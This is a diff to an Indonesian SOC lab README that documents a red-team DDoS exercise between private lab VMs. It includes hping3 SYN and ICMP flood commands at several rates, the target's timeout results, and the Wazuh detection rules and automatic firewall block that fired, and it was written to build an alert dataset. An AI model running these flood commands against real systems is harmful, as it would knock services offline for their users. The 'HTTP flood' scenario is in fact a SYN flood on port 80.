@@ -308,6 +308,126 @@ sudo pkill -9 hping3
 ```
 
 
+# A2 — Red Team DDoS & Pengukuran Dampak
+
+## Identitas
+
+| | |
+|---|---|
+| **Role** | A2 — Red Team DDoS & Pengukuran Dampak |
+| **VM Attacker** | vm3-agent2 (IP: 10.0.0.6) |
+| **VM Target** | agent-vm2 / vm2-agent1 (IP: 10.0.0.5) |
+| **Tanggal Eksekusi** | 24 Juni 2026 |
+
+---
+
+## Tujuan
+
+Mengeksekusi serangan DDoS ke web server target dan mendokumentasikan dampak nyata terhadap performa web, sehingga menghasilkan alert Wazuh yang dapat digunakan A4 untuk labeling dataset.
+
+---
+
+## Infrastruktur
+
+```
+[vm3-agent2] 10.0.0.6  ──── nyerang ────►  [agent-vm2] 10.0.0.5
+  (Attacker)                                  (Web Server Target / Korban)
+                                                       │
+                                               Wazuh Agent aktif
+                                                       │
+                                               [vm1-manager] 4.194.10.103
+                                               (Wazuh Manager — menerima alert)
+```
+
+---
+
+## Baseline (Sebelum Serangan)
+
+Response time web server dalam kondisi normal:
+
+```
+[1] Response: 0.001156s | HTTP: 200
+[2] Response: 0.001280s | HTTP: 200
+[3] Response: 0.001179s | HTTP: 200
+```
+
+> Web server merespons normal di ~0.001s dengan HTTP 200.
+
+---
+
+## Skenario Serangan
+
+### Skenario 1 — SYN Flood LOW
+```bash
+sudo hping3 -S -p 80 -i u10000 10.0.0.5
+```
+- **Interval:** 10ms antar paket
+- **Dampak:** Response time naik ke 5.00s (timeout)
+
+### Skenario 2 — SYN Flood MEDIUM
+```bash
+sudo hping3 -S -p 80 -i u5000 10.0.0.5
+```
+- **Interval:** 5ms antar paket
+- **Dampak:** Response time naik ke 5.00s (timeout)
+
+### Skenario 3 — SYN Flood HIGH
+```bash
+sudo hping3 -S -p 80 --flood 10.0.0.5
+```
+- **Mode:** Flood (secepat mungkin, no reply shown)
+- **Dampak:** Response time naik ke 5.00s (timeout)
+
+### Skenario 4 — ICMP Flood
+```bash
+sudo hping3 --icmp --flood 10.0.0.5
+```
+- **Protocol:** ICMP
+- **Dampak:** Response time naik ke 5.00s (timeout)
+
+### Skenario 5 — HTTP Flood
+```bash
+sudo hping3 -S --flood -p 80 10.0.0.5
+```
+- **Target:** Port 80 (HTTP)
+- **Dampak:** Response time naik ke 5.00s (timeout)
+
+---
+
+## Hasil & Dampak
+
+| Kondisi | Response Time | HTTP Status |
+|---|---|---|
+| Normal (baseline) | ~0.001s | 200 OK |
+| Saat serangan aktif | 5.000s | Timeout |
+| Setelah serangan berhenti | ~0.001s | 200 OK |
+
+> Semua 5 skenario berhasil menyebabkan web server tidak dapat diakses (timeout).
+
+---
+
+## Alert Wazuh yang Terdeteksi
+
+| Rule ID | Level | Description | MITRE | Tactic |
+|---|---|---|---|---|
+| 100011 | 12 (CRITICAL) | 🔴 Kemungkinan Serangan SYN Flood DDoS Sedang Berlangsung! | T1498.001 | Impact |
+| 100010 | 6 | IPTables: Deteksi awal traffic SYN yang mencurigakan (Indikasi DDoS) | T1498.001 | Impact |
+
+**Active Response** juga terpicu otomatis: `firewall-drop` memblokir IP attacker (10.0.0.6).
+
+---
+
+## Deliverables
+
+- [x] Screenshot response time 0.001s → 5.00s saat DDoS
+- [x] Screenshot alert DDoS di Wazuh Dashboard (agent-vm2)
+- [x] Log command hping3 per skenario (tercatat di alerts.log)
+- [x] Raw alert export JSON (`ddos_alerts.json`) → diserahkan ke A4
+
+---
+
+
+
 ## FINAL PROJECT UPDATE
 
 # A3 Progress - Wazuh SOC Project
